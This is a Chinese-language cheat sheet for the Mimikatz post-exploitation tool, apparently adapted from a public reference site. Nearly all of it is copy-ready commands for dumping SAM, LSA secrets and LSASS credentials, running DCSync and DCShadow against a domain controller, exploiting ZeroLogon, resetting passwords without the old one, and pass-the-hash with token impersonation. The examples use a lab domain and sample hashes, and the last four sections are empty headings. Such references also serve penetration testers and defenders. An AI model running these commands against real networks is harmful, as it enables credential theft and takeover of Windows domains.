此文档参考内容见[这里](https://tools.thehacker.recipes/mimikatz/modules)

# privilege
```
privilege::backup requests the backup privilege (SeBackupPrivilege)
privilege::debug requests the debug privilege (SeDebugPrivilege)
privilege::driver requests the load driver privilege (SeLoadDriverPrivilege)
privilege::id requests a privilege by its id
privilege::name requests a privilege by its name
privilege::restore requests the restore privilege (SeRestorePrivilege)
privilege::security requests the security privilege (SeSecurityPrivilege)
privilege::sysenv requests the system environment privilege (SeSystemEnvironmentPrivilege)
privilege::tcb requests the tcb privilege (SeTcbPrivilege)
```

# lsadump模块

## backupkeys
从域控制器转储DPAPI backup keys
```
mimikatz # lsadump::backupkeys /export
```

## cache
从注册表dump出缓存凭据
```
mimikatz # lsadump::cache
```

## changentlm
可用于更改用户的密码
```
mimikatz # lsadump::changentlm /server:DC.hacklab.local /user:adriane.lena /old:cded5acd2c1fc0f816c63ef317937deb /newpassword:WhatEverYouWant
```

## dcshadow
执行dcshadow攻击

修改组id
```
mimikatz # lsadump::dcshadow /object=optimus /attribute=primaryGroupID /value=512
```

执行修改
```
mimikatz # lsadump::dcshadow /push
```

## dcsync
请求域控同步从而dump出哈希

单个用户
```
mimikatz # lsadump::dcsync /domain:hacklab.local /user:hacklab\Administrator
```

所有用户
```
mimikatz # lsadump::dcsync /domain:hacklab.local /all
```

## netsync

请求目标计算机的rc4秘钥，需要dc主机的哈希
```
mimikatz # lsadump::netsync /dc:dc.hacklab.local /user:dc$ /ntlm:5b7ba7b6131a4aab1bbd60ba1a810e53 /account:win7$
```

## lsa

从内存中提取哈希值

```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

> /inject : when run on a workstation, it will dump the LM and NT password hashes. When run on domain controller is will dump LM, NT, Wdigest, Kerberos keys and password history.


## packages
列出可用的windows身份验证机制

```
mimikatz # lsadump::packages
```

## postzerologon

> lsadump::postzerologon is a procedure to update AD domain password and its local stored password remotely mimic netdom resetpwd. Experimental and best situation after reboot

```
mimikatz # lsadump::postzerologon /target:192.168.0.10 /account:dc$
```

## rpdata

检索私人数据

```
mimikatz # lsadump::RpData
```

## sam

转储本地安全账户管理器（SAM）NT的哈希值

```
mimikatz # lsadump::sam
```

**离线转存**

cmd下
```
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
```

执行离线转存
```
mimikatz # lsadump::sam /system:system.hive /sam:sam.hive
```

## secrets
可以用来从注册表中转储LSA的secrets。它检索SysKey来解密Secrets条目
```
mimikatz # lsadump::secrets
```

**离线转存**

cmd下
```
reg save HKLM\SYSTEM system.hive
reg save HKLM\security security.hive
```

执行离线转存
```
mimikatz # lsadump::secrets /system:system.hive /sam:security.hive
```

## setntlm
可以用来在不知道用户当前密码的情况下执行密码重置。在活动目录访问控制（ACL）滥用情况下，它可能很有用
```
mimikatz # lsadump::setntlm /user:optimus /password:VeryStrongPass1! /server:dc.hacklab.local
```

## trust

dump出域和林的信任秘钥
```
mimikatz # lsadump::trust /patch
```

## zerologon
检测并利用ZeroLogon漏洞
```
mimikatz # lsadump::zerologon /target:dc.hacklab.local /account:dc$
```

# sekurlsa模块
这个模块可能是Mimikatz用户中使用最多的模块。它从LSA的子系统服务(LSASS)中检索明文密码、kerberos票、pin码等

## backupkeys

列出备份秘钥
```
mimikatz # sekurlsa::backupkeys
```

## bootkey
设置SecureKernel Boot Key并尝试解密LSA Isolated凭证
```
mimikatz # sekurlsa::bootkey
```

## cloudap
列出 Azure (Primary Refresh Token) 凭据

```
mimikatz # sekurlsa::cloudap
```

## credman
通过针对微软本地安全授权服务器DLL（lsasrv.dll）列出凭证管理器。

```
mimikatz # sekurlsa::credman
```

## dpapi
列出DPAPI缓存的masterkeys

```
mimikatz # sekurlsa::dpapi
```

## dpapisystem

列出DPAPI_SYSTEM secret key

```
mimikatz # sekurlsa::dpapisystem
```

## ekeys

列出Kerberos加密密钥
```
mimikatz # sekurlsa::ekeys
```

## kerberos

列出Kerberos凭证
```
mimikatz # sekurlsa::kerberos
```

## krbtgt
检索krbtgt RC4（即NT哈希值）、AES128和AES256哈希值

```
mimikatz # sekurlsa::krbtgt
```

## livessp
列出了LiveSSP凭证。据微软称，LiveSSP供应商默认包含在Windows 8和更高版本中，并包含在Office 365登录助手中

```
mimikatz # sekurlsa::livessp
```

## logonpasswords
列出所有可用的提供者凭证。这通常显示最近登录的用户和计算机凭证

```
mimikatz # sekurlsa::logonpasswords
```

## minidump

可以针对转储的LSASS进程文件使用，它不需要管理权限。它被认为是一种 "离线 "转储。
```
mimikatz # sekurlsa::minidump file.dmp

mimikatz # sekurlsa::logonpasswords
```

## msv

通过针对MSV1_0 Authentication Package，转储和列出NT哈希值（和其他secrets）
```
mimikatz # sekurlsa::msv
```

## process

通过切换到LSASS进程的上下文，之后就可以使用sekurlsa::minidump命令

```
mimikatz # sekurlsa::minidump lsass.dump.dmp

mimikatz # sekurlsa::process
```

## pth

执行Pass-the-Hash、Pass-the-Key和Over-Pass-the-Hash。认证成功后，将运行一个程序（注：默认为cme.exe）

```
mimikatz # sekurlsa::pth /user:Administrator /domain:hacklab.local /ntlm:b09a14d2d325026f8986d4a874fbcbc7
```

**令牌模拟**
当前账号是普通域用户，知道Administrator的哈希

模拟Administrator的令牌，使用```/impersonate```参数
```
mimikatz # sekurlsa::pth /user:Administrator /domain:hacklab.local /ntlm:b09a14d2d325026f8986d4a874fbcbc7 /impersonate
```

现在在Administrator的上下文中可以执行dcsync
```
mimikatz # lsadump::dcsync /user:Administrator
```

## ssp

列出Security Support Provider (SSP)凭据

```
mimikatz # sekurlsa::ssp
```

## tickets
列出属于目标服务器/工作站上所有认证用户的Kerberos ticket。与kerberos::list不同，sekurlsa使用内存读取，不受密钥输出的限制。Sekurlsa也可以访问其他会话（用户）的票据。

```
mimikatz # sekurlsa::tickets
```

## trust

检索林信任keys
```
mimikatz # sekurlsa::trust
```

## tspkg

列出 TsPkg凭据，这个凭证提供者用于终端服务器认证
```
mimikatz # sekurlsa::tspkg
```

## wdigest
列出了WDigest凭证。据微软称，WDigest.dll是在Windows XP操作系统中引入的。Digest认证协议旨在与超文本传输协议（HTTP）和简单认证安全层（SASL）交换使用
```
mimikatz # sekurlsa::wdigest
```


# Vault模块

Mimikatz的这个模块与Windows Credentials Vault进行交互。DPAPI是获得相同结果的一个更好的替代选项

## cred

枚举vault 里面的凭据

```
mimikatz # vault::cred

mimikatz # vault::cred /patch
```

## list

列出Windows Vault中保存的凭证，如计划任务、RDP、当前用户的Internet Explorer等

```
mimikatz # vault::list
```

# dpapi


# kerberos


# process



# token